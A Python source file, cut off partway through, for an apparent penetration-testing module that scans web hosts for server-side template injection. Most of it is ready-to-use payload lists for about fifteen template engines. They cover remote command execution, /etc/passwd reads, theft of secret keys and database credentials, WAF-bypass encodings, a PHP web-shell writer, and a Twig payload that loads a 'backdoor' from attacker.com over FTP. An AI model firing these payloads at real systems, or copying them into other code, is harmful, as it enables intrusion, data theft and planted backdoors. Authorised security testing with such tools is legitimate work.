"""
Server-Side Template Injection (SSTI) Scanner - ENTERPRISE EDITION v2.0

Enterprise-grade template injection vulnerability scanner with comprehensive
coverage for modern template engines and advanced bypass techniques.

Features:
- Multi-engine detection (15+ template engines)
- Polyglot payloads for blind detection
- WAF/Filter bypass techniques
- Sandbox escape methods
- RCE confirmation testing
- Context-aware payload generation
- Error-based engine fingerprinting
- Encoding bypass (URL, Unicode, HTML entities)
- Nested template injection
- Time-based blind SSTI detection

Supported Template Engines:
- Jinja2 (Python/Flask) - Full RCE chain
- Twig (PHP/Symfony) - Filter exploitation
- Freemarker (Java) - Built-in execution
- Velocity (Java) - ClassTool exploitation
- Smarty (PHP) - Static method calls
- Thymeleaf (Java) - SpEL injection
- ERB (Ruby/Rails) - System calls
- Mako (Python) - Module traversal
- Tornado (Python) - Handler settings
- EJS (Node.js) - Global process access
- Pebble (Java) - Type reflection
- Handlebars (JavaScript) - Prototype pollution
- Nunjucks (JavaScript) - Range exploitation
- Dust.js (JavaScript) - Helper exploitation
- Pug/Jade (JavaScript) - Code blocks

CWE Coverage:
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code
- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

Author: PetNTester AI Enterprise
Version: 2.0.0-enterprise
"""

from __future__ import annotations

import asyncio
import hashlib
import re
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import urljoin, quote, urlencode, parse_qs, urlparse

import httpx

from scanning.vuln_scanner import Finding, ScanModule
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


# ============================================================================
# ENTERPRISE DATA STRUCTURES
# ============================================================================

class TemplateEngine(Enum):
    """Supported template engines."""
    JINJA2 = auto()      # Python (Flask, Django)
    TWIG = auto()        # PHP (Symfony)
    FREEMARKER = auto()  # Java
    VELOCITY = auto()    # Java
    SMARTY = auto()      # PHP
    THYMELEAF = auto()   # Java (Spring)
    ERB = auto()         # Ruby (Rails)
    MAKO = auto()        # Python
    TORNADO = auto()     # Python
    EJS = auto()         # Node.js
    PEBBLE = auto()      # Java
    HANDLEBARS = auto()  # JavaScript
    NUNJUCKS = auto()    # JavaScript
    DUST = auto()        # JavaScript
    PUG = auto()         # JavaScript (formerly Jade)
    UNKNOWN = auto()


class SSTIVulnType(Enum):
    """Types of SSTI vulnerabilities."""
    EXPRESSION_EVALUATION = auto()  # Basic math/string evaluation
    OBJECT_ACCESS = auto()          # Access to objects/config
    FILE_READ = auto()              # Arbitrary file read
    REMOTE_CODE_EXEC = auto()       # Full RCE
    INFORMATION_DISCLOSURE = auto() # Sensitive info leak
    SANDBOX_ESCAPE = auto()         # Breaking out of sandbox
    BLIND_SSTI = auto()             # Time-based/OOB detection


@dataclass
class SSTITestResult:
    """Result of an SSTI test."""
    vulnerable: bool
    engine: Optional[TemplateEngine] = None
    vuln_type: Optional[SSTIVulnType] = None
    confidence: float = 0.0
    payload: str = ""
    evidence: list[str] = field(default_factory=list)
    response_indicator: str = ""


@dataclass
class EngineSignature:
    """Signature for identifying template engines."""
    engine: TemplateEngine
    keywords: list[str]
    error_patterns: list[str]
    behavior_tests: dict[str, str]  # payload -> expected result


# ============================================================================
# ENTERPRISE PAYLOADS - Comprehensive Template Engine Coverage
# ============================================================================

# Polyglot detection payloads - work across multiple engines
POLYGLOT_DETECTION_PAYLOADS = [
    # Universal math evaluation
    {"payload": "{{7*7}}", "expected": "49", "engines": ["jinja2", "twig", "nunjucks", "handlebars"]},
    {"payload": "${7*7}", "expected": "49", "engines": ["freemarker", "velocity", "mako", "thymeleaf"]},
    {"payload": "#{7*7}", "expected": "49", "engines": ["pug", "thymeleaf", "erb"]},
    {"payload": "<%= 7*7 %>", "expected": "49", "engines": ["erb", "ejs"]},
    {"payload": "${{7*7}}", "expected": "49", "engines": ["thymeleaf"]},
    {"payload": "{7*7}", "expected": "49", "engines": ["smarty"]},
    {"payload": "{{=7*7}}", "expected": "49", "engines": ["nunjucks"]},
    {"payload": "<%=7*7%>", "expected": "49", "engines": ["ejs", "erb"]},
    
    # String multiplication (engine fingerprinting)
    {"payload": "{{7*'7'}}", "expected": "7777777", "engines": ["jinja2"]},
    {"payload": "{{7*'x'}}", "expected": "xxxxxxx", "engines": ["jinja2"]},
    
    # Concatenation tests
    {"payload": "{{'foo'+'bar'}}", "expected": "foobar", "engines": ["jinja2", "nunjucks"]},
    {"payload": "${\"foo\"+\"bar\"}", "expected": "foobar", "engines": ["freemarker"]},
]

# Engine-specific detection payloads with unique signatures
ENGINE_SPECIFIC_DETECTION = {
    TemplateEngine.JINJA2: {
        "payloads": [
            {"payload": "{{config}}", "expected": "Config", "unique": True},
            {"payload": "{{self}}", "expected": "TemplateReference", "unique": True},
            {"payload": "{{request}}", "expected": "Request", "unique": False},
            {"payload": "{{lipsum}}", "expected": "function", "unique": True},
            {"payload": "{{cycler}}", "expected": "cycler", "unique": True},
            {"payload": "{{joiner}}", "expected": "joiner", "unique": True},
            {"payload": "{{namespace}}", "expected": "Namespace", "unique": True},
            {"payload": "{{range(5)}}", "expected": "range", "unique": False},
        ],
        "error_signatures": [
            "jinja2.exceptions",
            "UndefinedError",
            "TemplateNotFound",
            "TemplateSyntaxError",
        ],
    },
    TemplateEngine.TWIG: {
        "payloads": [
            {"payload": "{{_self}}", "expected": "__TwigTemplate", "unique": True},
            {"payload": "{{_context}}", "expected": "Array", "unique": False},
            {"payload": "{{app}}", "expected": "Symfony", "unique": True},
            {"payload": "{{'foo'|upper}}", "expected": "FOO", "unique": False},
            {"payload": "{{dump()}}", "expected": "null", "unique": True},
        ],
        "error_signatures": [
            "Twig_Error",
            "Twig\\Error",
            "TwigException",
            "Unknown filter",
        ],
    },
    TemplateEngine.FREEMARKER: {
        "payloads": [
            {"payload": "${.version}", "expected": "2.", "unique": True},
            {"payload": "${.now}", "expected": "202", "unique": False},
            {"payload": "<#assign x=1>${x}", "expected": "1", "unique": True},
            {"payload": "${\"test\"?upper_case}", "expected": "TEST", "unique": True},
        ],
        "error_signatures": [
            "freemarker.core",
            "FreeMarker",
            "FTL stack trace",
            "ParseException",
        ],
    },
    TemplateEngine.VELOCITY: {
        "payloads": [
            {"payload": "#set($x=7*7)$x", "expected": "49", "unique": True},
            {"payload": "$class", "expected": "class", "unique": True},
            {"payload": "#if(true)yes#end", "expected": "yes", "unique": True},
        ],
        "error_signatures": [
            "VelocityException",
            "org.apache.velocity",
            "ParseErrorException",
        ],
    },
    TemplateEngine.SMARTY: {
        "payloads": [
            {"payload": "{$smarty.version}", "expected": ".", "unique": True},
            {"payload": "{$smarty.now}", "expected": "", "unique": False},
            {"payload": "{math equation=\"7*7\"}", "expected": "49", "unique": True},
            {"payload": "{'test'|upper}", "expected": "TEST", "unique": False},
        ],
        "error_signatures": [
            "Smarty error",
            "SmartyException",
            "Smarty_Internal",
        ],
    },
    TemplateEngine.THYMELEAF: {
        "payloads": [
            {"payload": "[[${7*7}]]", "expected": "49", "unique": True},
            {"payload": "[(${7*7})]", "expected": "49", "unique": True},
            {"payload": "__${7*7}__", "expected": "49", "unique": True},
        ],
        "error_signatures": [
            "org.thymeleaf",
            "TemplateProcessingException",
            "SpelEvaluationException",
        ],
    },
    TemplateEngine.ERB: {
        "payloads": [
            {"payload": "<%= 7*7 %>", "expected": "49", "unique": False},
            {"payload": "<%= self.class %>", "expected": "Binding", "unique": True},
            {"payload": "<%= Rails.version %>", "expected": ".", "unique": True},
        ],
        "error_signatures": [
            "ActionView",
            "ERB::Util",
            "SyntaxError",
            "Rails",
        ],
    },
    TemplateEngine.MAKO: {
        "payloads": [
            {"payload": "${7*7}", "expected": "49", "unique": False},
            {"payload": "<%7*7%>", "expected": "49", "unique": True},
            {"payload": "${self}", "expected": "Context", "unique": True},
        ],
        "error_signatures": [
            "mako.exceptions",
            "MakoException",
            "CompileException",
        ],
    },
    TemplateEngine.EJS: {
        "payloads": [
            {"payload": "<%= 7*7 %>", "expected": "49", "unique": False},
            {"payload": "<%- 7*7 %>", "expected": "49", "unique": False},
            {"payload": "<%= global %>", "expected": "object", "unique": True},
            {"payload": "<%= process.version %>", "expected": "v", "unique": True},
        ],
        "error_signatures": [
            "EJS",
            "ReferenceError",
            "ejs.js",
        ],
    },
    TemplateEngine.PEBBLE: {
        "payloads": [
            {"payload": "{{7*7}}", "expected": "49", "unique": False},
            {"payload": "{% set x = 7*7 %}{{x}}", "expected": "49", "unique": True},
        ],
        "error_signatures": [
            "PebbleException",
            "com.mitchellbosecke.pebble",
        ],
    },
    TemplateEngine.NUNJUCKS: {
        "payloads": [
            {"payload": "{{7*7}}", "expected": "49", "unique": False},
            {"payload": "{{range(5)}}", "expected": "[object", "unique": True},
            {"payload": "{{constructor}}", "expected": "function", "unique": False},
        ],
        "error_signatures": [
            "nunjucks",
            "Template render error",
        ],
    },
    TemplateEngine.HANDLEBARS: {
        "payloads": [
            {"payload": "{{this}}", "expected": "", "unique": False},
            {"payload": "{{constructor.constructor}}", "expected": "function", "unique": False},
        ],
        "error_signatures": [
            "Handlebars",
            "Parse error",
        ],
    },
}

# RCE payloads by engine (comprehensive)
RCE_PAYLOADS = {
    TemplateEngine.JINJA2: [
        # Object traversal methods
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__base__.__subclasses__()}}",
        "{{().__class__.__bases__[0].__subclasses__()}}",
        # Config/globals access
        "{{config.items()}}",
        "{{self.__init__.__globals__}}",
        "{{self._TemplateReference__context}}",
        # Subprocess/os access
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        # Request object exploitation
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{request.__class__._get_current_object().__class__.__mro__[1].__subclasses__()}}",
        # Namespace exploitation
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        # URL_for exploitation (Flask)
        "{{url_for.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{url_for.__globals__.os.popen('id').read()}}",
        # Get_flashed_messages (Flask)
        "{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        # Dict bypass techniques
        "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('id').read()}}",
        # Jinja2 3.x specific
        "{{self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read()}}",
    ],
    TemplateEngine.TWIG: [
        # Filter exploitation
        "{{'/etc/passwd'|file_excerpt(1,30)}}",
        "{{app.request.server.all|join(',')}}",
        "{{_self.env.display('')}}{{system('id')}}",
        # Object instantiation
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        # Twig 1.x
        "{{_self.env.setCache('ftp://attacker.com')}}{{_self.env.loadTemplate('backdoor')}}",
        # Attribute access
        "{{['id']|filter('system')}}",
        "{{['id']|map('system')|join}}",
        "{{['id','whoami']|filter('exec')}}",
        # Sort callback
        "{{['id',1]|sort('system')}}",
        # Array map
        "{{'id'|filter('passthru')}}",
    ],
    TemplateEngine.FREEMARKER: [
        # Built-in execution
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        # ObjectConstructor
        "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"id\").start()}",
        # JythonRuntime
        "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()><#assign br=ob(\"java.io.BufferedReader\",ob(\"java.io.InputStreamReader\",ob(\"java.lang.ProcessBuilder\",\"id\").start().getInputStream()))>${br.readLine()}",
        # API access
        "<#assign uri=object.class.getResource(\"/\").toURI()><#assign input=uri.create(\"file:///etc/passwd\").toURL().openConnection()><#assign is=input.getInputStream()><#assign br=object.class.forName(\"java.io.BufferedReader\").getConstructor(object.class.forName(\"java.io.Reader\")).newInstance(object.class.forName(\"java.io.InputStreamReader\").getConstructor(object.class.forName(\"java.io.InputStream\")).newInstance(is))>${br.readLine()}",
    ],
    TemplateEngine.VELOCITY: [
        # Runtime execution
        "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($chr=$x.class.forName('java.lang.Character'))##\n#set($str=$x.class.forName('java.lang.String'))##\n#set($ex=$rt.getRuntime().exec('id'))##\n$ex.waitFor()\n#set($out=$ex.getInputStream())##\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
        # ClassTool
        "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id').waitFor()",
        # Simple version
        "#set($e='e')$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')",
    ],
    TemplateEngine.SMARTY: [
        # PHP code execution
        "{php}system('id');{/php}",
        "{php}passthru('id');{/php}",
        # Static class method
        "{self::getStreamVariable(\"file:///etc/passwd\")}",
        # Smarty tags bypass
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
        # If tag exploitation
        "{if system('id')}{/if}",
        "{if passthru('id')}{/if}",
    ],
    TemplateEngine.THYMELEAF: [
        # SpEL injection
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x",
        # URL-based
        "__${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}__::.x",
        # Alternative syntax
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "*{T(java.lang.Runtime).getRuntime().exec('id')}",
        # Spring beans
        "${#ctx.getEnvironment().getProperty('spring.datasource.password')}",
    ],
    TemplateEngine.ERB: [
        "<%= system('id') %>",
        "<%= `id` %>",
        "<%= exec('id') %>",
        "<%= IO.popen('id').readlines() %>",
        "<%= require 'open3'; Open3.capture3('id') %>",
        "<%= %x(id) %>",
        "<%= Kernel.system('id') %>",
        "<%= File.read('/etc/passwd') %>",
    ],
    TemplateEngine.MAKO: [
        "${self.module.cache.util.os.system('id')}",
        "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
        "${self.module.cache.util.os.popen('id').read()}",
        "<%import os%>${os.popen('id').read()}",
        "<%\nimport subprocess\nprint(subprocess.check_output('id',shell=True))\n%>",
    ],
    TemplateEngine.TORNADO: [
        "{{handler.settings}}",
        "{%import os%}{{os.popen('id').read()}}",
        "{{handler.application.settings}}",
        "{%import subprocess%}{{subprocess.check_output('id',shell=True)}}",
    ],
    TemplateEngine.EJS: [
        "<%= global.process.mainModule.require('child_process').execSync('id') %>",
        "<%= global.process.mainModule.require('child_process').spawnSync('id').stdout %>",
        "<%= require('child_process').execSync('id') %>",
        "<%- global.process.mainModule.require('child_process').execSync('id') %>",
    ],
    TemplateEngine.PEBBLE: [
        "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}",
        "{% set cmd = 'id' %}{{ (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) }}",
    ],
    TemplateEngine.NUNJUCKS: [
        "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
    ],
    TemplateEngine.HANDLEBARS: [
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
    ],
}

# WAF/Filter bypass payloads
WAF_BYPASS_PAYLOADS = [
    # URL encoding
    {"original": "{{7*7}}", "bypass": "%7b%7b7*7%7d%7d", "type": "url_encode"},
    {"original": "{{config}}", "bypass": "%7b%7bconfig%7d%7d", "type": "url_encode"},
    
    # Double URL encoding
    {"original": "{{7*7}}", "bypass": "%257b%257b7*7%257d%257d", "type": "double_url"},
    
    # Unicode encoding
    {"original": "{{7*7}}", "bypass": "\u007b\u007b7*7\u007d\u007d", "type": "unicode"},
    
    # HTML entities
    {"original": "{{7*7}}", "bypass": "&#123;&#123;7*7&#125;&#125;", "type": "html_entity"},
    {"original": "{{7*7}}", "bypass": "&#x7b;&#x7b;7*7&#x7d;&#x7d;", "type": "html_hex"},
    
    # Whitespace bypass
    {"original": "{{7*7}}", "bypass": "{{ 7*7 }}", "type": "whitespace"},
    {"original": "{{7*7}}", "bypass": "{{  7 * 7  }}", "type": "whitespace"},
    {"original": "{{7*7}}", "bypass": "{{\t7*7\t}}", "type": "tab"},
    {"original": "{{7*7}}", "bypass": "{{\n7*7\n}}", "type": "newline"},
    
    # Comment injection (Jinja2)
    {"original": "{{7*7}}", "bypass": "{{7{#comment#}*7}}", "type": "comment"},
    
    # String concatenation bypass
    {"original": "{{config}}", "bypass": "{{\"con\"+\"fig\"}}", "type": "concat"},
    {"original": "{{config}}", "bypass": "{{'con'~'fig'}}", "type": "tilde_concat"},
    
    # Filter chaining bypass
    {"original": "{{config}}", "bypass": "{{config|safe}}", "type": "filter"},
    {"original": "{{7*7}}", "bypass": "{{(7*7)|safe}}", "type": "filter"},
    
    # Variable indirection
    {"original": "{{config}}", "bypass": "{{self.__dict__['config']}}", "type": "dict_access"},
    
    # Alternative delimiters (if configurable)
    {"original": "{{7*7}}", "bypass": "{%print 7*7%}", "type": "print_tag"},
    {"original": "{{config}}", "bypass": "{%print config%}", "type": "print_tag"},
]

# Blind SSTI detection payloads (time-based)
BLIND_SSTI_PAYLOADS = [
    # Jinja2 time delay
    {"payload": "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('time')|attr('sleep')(5)}}", "engine": "jinja2", "delay": 5},
    
    # Ruby sleep
    {"payload": "<%= sleep(5) %>", "engine": "erb", "delay": 5},
    
    # Java Thread.sleep
    {"payload": "${T(java.lang.Thread).sleep(5000)}", "engine": "thymeleaf", "delay": 5},
    
    # Python time.sleep
    {"payload": "<%import time;time.sleep(5)%>", "engine": "mako", "delay": 5},
    
    # Node.js
    {"payload": "<%require('child_process').execSync('sleep 5')%>", "engine": "ejs", "delay": 5},
]

# Information disclosure payloads
INFO_DISCLOSURE_PAYLOADS = [
    # Environment/Config
    {"payload": "{{config}}", "type": "config", "engine": "jinja2"},
    {"payload": "{{settings}}", "type": "settings", "engine": "generic"},
    {"payload": "{{request.environ}}", "type": "environ", "engine": "jinja2"},
    {"payload": "{{handler.settings}}", "type": "settings", "engine": "tornado"},
    {"payload": "{{app.request.server.all}}", "type": "server", "engine": "twig"},
    
    # Database credentials
    {"payload": "{{config.SQLALCHEMY_DATABASE_URI}}", "type": "db_creds", "engine": "jinja2"},
    {"payload": "${spring.datasource.url}", "type": "db_creds", "engine": "thymeleaf"},
    
    # Secret keys
    {"payload": "{{config.SECRET_KEY}}", "type": "secret", "engine": "jinja2"},
    {"payload": "{{settings.SECRET_KEY}}", "type": "secret", "engine": "django"},
    
    # File read
    {"payload": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", "type": "file_read", "engine": "jinja2"},
    {"payload": "<%= File.read('/etc/passwd') %>", "type": "file_read", "engine": "erb"},
]


class SSTIScanner(ScanModule):
    """
    Server-Side Template Injection Scanner - ENTERPRISE EDITION v2.0
    
    Comprehensive SSTI vulnerability testing including:
    - Multi-engine detection (15+ template engines)
    - Polyglot payloads for broad coverage
    - WAF/Filter bypass techniques
    - Sandbox escape methods
    - Context-aware RCE confirmation
    - Blind SSTI detection (time-based)
    - Error-based engine fingerprinting
    - Information disclosure testing
    
    CWE Coverage: CWE-94, CWE-95, CWE-1336
    """
    
    name = "ssti_scanner"
    version = "2.0-enterprise"
    
    # Template engine detection payloads with expected results
    DETECTION_PAYLOADS = {
        # Universal math payload - works in most engines
        "{{7*7}}": "49",
        "${7*7}": "49",
        "#{7*7}": "49",
        "<%= 7*7 %>": "49",
        "${{7*7}}": "49",
        "{{= 7*7}}": "49",
        "{7*7}": "49",
        
        # Jinja2/Twig specific
        "{{7*'7'}}": "7777777",
        "{{config}}": "Config",
        
        # Freemarker
        "${7*7}": "49",
        "<#assign x=7*7>${x}": "49",
        
        # Velocity
        "#set($x=7*7)$x": "49",
        "$class.inspect": "class",
        
        # Smarty
        "{php}echo 7*7;{/php}": "49",
        "{math equation=\"7*7\"}": "49",
        
        # Thymeleaf
        "[[${7*7}]]": "49",
        
        # ERB (Ruby)
        "<%= 7*7 %>": "49",
        "<%= system('id') %>": "uid=",
        
        # Mako
        "${7*7}": "49",
        "<%7*7%>": "49",
        
        # EJS
        "<%= 7*7 %>": "49",
        "<%- 7*7 %>": "49",
        
        # Pug/Jade
        "#{7*7}": "49",
    }
    
    # Engine-specific RCE payloads (kept for backward compatibility)
    RCE_PAYLOADS = {
        "jinja2": RCE_PAYLOADS[TemplateEngine.JINJA2],
        "twig": RCE_PAYLOADS[TemplateEngine.TWIG],
        "freemarker": RCE_PAYLOADS[TemplateEngine.FREEMARKER],
        "velocity": RCE_PAYLOADS[TemplateEngine.VELOCITY],
        "smarty": RCE_PAYLOADS[TemplateEngine.SMARTY],
        "thymeleaf": RCE_PAYLOADS[TemplateEngine.THYMELEAF],
        "erb": RCE_PAYLOADS[TemplateEngine.ERB],
        "mako": RCE_PAYLOADS[TemplateEngine.MAKO],
        "tornado": RCE_PAYLOADS[TemplateEngine.TORNADO],
        "ejs": RCE_PAYLOADS[TemplateEngine.EJS],
        "pebble": RCE_PAYLOADS[TemplateEngine.PEBBLE],
    }
    
    # Engine identification signatures
    ENGINE_SIGNATURES = {
        "jinja2": ["jinja2", "flask", "werkzeug", "TemplateNotFound"],
        "twig": ["twig", "symfony", "Twig_Error"],
        "freemarker": ["freemarker", "FreeMarker", "FTL stack trace"],
        "velocity": ["velocity", "VelocityException", "org.apache.velocity"],
        "smarty": ["smarty", "Smarty error"],
        "thymeleaf": ["thymeleaf", "org.thymeleaf"],
        "erb": ["erb", "ActionView", "Rails"],
        "mako": ["mako", "MakoException"],
        "tornado": ["tornado"],
        "ejs": ["ejs"],
        "pebble": ["pebble", "PebbleException"],
    }
    
    def __init__(self, settings: Settings) -> None:
        super().__init__(settings)
        self.timeout = settings.timeouts.request_timeout
        # Track partial findings for timeout recovery
        self._partial_findings: list[dict[str, Any]] = []
    
    def get_partial_findings(self) -> list[dict[str, Any]]:
        """Return partial findings collected so far (for timeout recovery)."""
        return self._partial_findings.copy()
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """
        Enterprise: Comprehensive SSTI vulnerability scan.
        """
        findings: list[dict[str, Any]] = []
        self._partial_findings = []  # Reset partial findings
        
        # Helper to extend findings and track for partial recovery
        def extend_findings(new_findings: list[dict[str, Any]]) -> None:
            findings.extend(new_findings)
            self._partial_findings.extend(new_findings)
        
        base_url = f"https://{host}" if not host.startswith("http") else host
        endpoints = asset_data.get("endpoints", [])
        urls = asset_data.get("urls", [base_url])
        forms = asset_data.get("forms", [])
        
        # Combine all testable URLs
        all_urls = list(set(endpoints + urls))[:50]
        
        async with httpx.AsyncClient(verify=False, timeout=self.timeout) as client:
            for url in all_urls:
                # Phase 1: Test URL parameters
                param_findings = await self._test_url_params_enterprise(
                    client, url, rate_limiter
                )
                extend_findings(param_findings)
                
                # Phase 2: Test form inputs
                form_findings = await self._test_forms_enterprise(
                    client, url, rate_limiter
                )
                extend_findings(form_findings)
                
                # Phase 3: Test path-based injection
                path_findings = await self._test_path_injection_enterprise(
                    client, url, rate_limiter
                )
                extend_findings(path_findings)
                
                # Phase 4: Test headers
                header_findings = await self._test_headers_enterprise(
                    client, url, rate_limiter
                )
                extend_findings(header_findings)
                
                # Phase 5: WAF bypass testing
                waf_findings = await self._test_waf_bypass(
                    client, url, rate_limiter
                )
                extend_findings(waf_findings)
                
                # Phase 6: Blind SSTI detection
                blind_findings = await self._test_blind_ssti(
                    client, url, rate_limiter
                )
                extend_findings(blind_findings)
        
        return {"findings": findings}
    
    async def _test_url_params_enterprise(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test URL parameters with comprehensive payload coverage.
        """
        findings = []
        
        # Extended parameter names to test
        test_params = [
            "name", "template", "page", "view", "content", "message",
            "text", "title", "body", "data", "input", "query", "search",
            "email", "username", "comment", "description", "preview",
            "render", "output", "display", "format", "layout", "theme",
            "lang", "locale", "file", "path", "url", "redirect", "return",
            "callback", "next", "goto", "ref", "action", "cmd", "exec",
            "tpl", "tmpl", "doc", "html", "raw", "debug", "test",
        ]
        
        # Parse existing parameters from URL
        parsed = urlparse(url)
        existing_params = parse_qs(parsed.query)
        all_params = list(set(test_params + list(existing_params.keys())))
        
        for param in all_params[:20]:  # Limit to avoid excessive testing
            # First test with polyglot payloads
            for detection in POLYGLOT_DETECTION_PAYLOADS[:10]:
                await rate_limiter.acquire()
                
                payload = detection["payload"]
                expected = detection["expected"]
                
                try:
                    test_url = self._build_test_url(url, param, payload)
                    response = await client.get(test_url)
                    
                    result = self._analyze_ssti_response(
                        response.text, payload, expected
                    )
                    
                    if result.vulnerable:
                        # Confirmed SSTI - identify engine
                        engine = await self._identify_engine_enterprise(
                            client, url, param, rate_limiter
                        )
                        
                        finding = Finding(
                            type="ssti",
                            name=f"Server-Side Template Injection ({engine.name if engine else 'Unknown'})",
                            severity="CRITICAL",
                            description=f"SSTI vulnerability detected in parameter '{param}'. "
                                       f"Template engine: {engine.name if engine else 'Unknown'}. "
                                       f"Template expressions are being evaluated server-side.",
                            host=urlparse(url).netloc,
                            matched_at=url,
                            evidence=[
                                f"Parameter: {param}",
                                f"Payload: {payload}",
                                f"Expected result: {expected}",
                                f"Confidence: {result.confidence:.0%}",
                                f"Engine indicators: {', '.join(result.evidence)}",
                            ],
                            cvss_score=9.8,
                            cwe="CWE-94",
                            remediation="Never pass user input directly to template engines. "
                                       "Use logic-less templates (Mustache) or strict sandboxing. "
                                       "Implement input validation and output encoding. "
                                       "Consider using template engines with auto-escaping.",
                        ).to_dict()
                        
                        findings.append(finding)
                        
                        # Test for RCE
                        if engine:
                            rce_findings = await self._test_rce_enterprise(
                                client, url, param, engine, rate_limiter
                            )
                            findings.extend(rce_findings)
                        
                        break  # Found SSTI in this param
                        
                except Exception as e:
                    logger.debug(f"SSTI test error: {e}")
        
        return findings
    
    def _build_test_url(self, url: str, param: str, payload: str) -> str:
        """Build test URL with payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _analyze_ssti_response(
        self,
        response_text: str,
        payload: str,
        expected: str,
    ) -> SSTITestResult:
        """Analyze response to determine if SSTI is present."""
        result = SSTITestResult(vulnerable=False)
        
        # Check if expected result is in response
        if expected in response_text:
            # Make sure the payload itself isn't just reflected
            if payload not in response_text:
                result.vulnerable = True
                result.confidence = 0.9
                result.response_indicator = expected
                result.evidence.append(f"Expected '{expected}' found in response")
                return result
            else:
                # Payload reflected but result also present - might be partial evaluation
                if response_text.count(expected) > response_text.count(payload):
                    result.vulnerable = True
                    result.confidence = 0.7
                    result.evidence.append("Partial template evaluation detected")
                    return result
        
        # Check for error messages that indicate template processing
        error_indicators = [
            "UndefinedError", "TemplateError", "SyntaxError",
            "ParseError", "Template", "render", "compile",
        ]
        
        for indicator in error_indicators:
            if indicator in response_text:
                result.evidence.append(f"Template error indicator: {indicator}")
                # Error indicates template processing even if not vulnerable
        
        return result
    
    async def _identify_engine_enterprise(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        rate_limiter: RateLimiter,
    ) -> Optional[TemplateEngine]:
        """
        Enterprise: Identify template engine using multiple techniques.
        """
        engine_scores: dict[TemplateEngine, int] = {e: 0 for e in TemplateEngine}
        
        for engine, config in ENGINE_SPECIFIC_DETECTION.items():
            for payload_config in config["payloads"][:5]:
                await rate_limiter.acquire()
                
                try:
                    test_url = self._build_test_url(url, param, payload_config["payload"])
                    response = await client.get(test_url)
                    
                    if payload_config["expected"] in response.text:
                        if payload_config.get("unique"):
                            engine_scores[engine] += 3  # Strong indicator
                        else:
                            engine_scores[engine] += 1
                    
                    # Check for error signatures
                    for sig in config.get("error_signatures", []):
                        if sig in response.text:
                            engine_scores[engine] += 2
                            
                except Exception:
                    continue
        
        # Return engine with highest score
        if max(engine_scores.values()) > 0:
            return max(engine_scores, key=engine_scores.get)
        
        return None
    
    async def _test_rce_enterprise(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        engine: TemplateEngine,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test RCE payloads for confirmed engine.
        """
        findings = []
        rce_payloads = RCE_PAYLOADS.get(engine, [])
        
        # RCE indicators
        rce_indicators = [
            ("uid=", "Linux user id"),
